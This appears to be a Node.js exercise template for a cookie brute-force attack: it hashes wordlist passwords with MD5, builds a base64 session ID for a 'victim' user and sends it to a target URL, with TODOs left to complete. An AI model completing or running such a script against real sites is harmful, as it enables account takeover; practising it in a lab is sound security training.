const fs = require("fs");
const crypto = require("crypto");

// TODO1:
// Set the missing configuration
const targetUrl = "";
const victimUsername = "";
const inputFilePath = "";

const candidates = fs.readFileSync(inputFilePath, "utf-8").split("\n");

async function bruteForce() {
  for (const password of candidates) {
    const hashedPassword = crypto
      .createHash("md5")
      .update(password.trim())
      .digest("hex");

    // TODO 2: construct the session ID value correctly
    const sessionId = Buffer.from(``).toString("base64");

    const response = await fetch(targetUrl, {
      method: "GET",
      headers: {
        // TODO 3: send the cookie correctly
      },
    });

    const text = await response.text();

    // TODO 4: detect success properly
    if (text.includes("")) {
      console.log("SUCCESS");
      console.log("Username:", victimUsername);
      console.log("Password:", password);
      // TODO 5: Optimize the search
    }
    console.log("Attempt:", password);
  }
}

bruteForce();
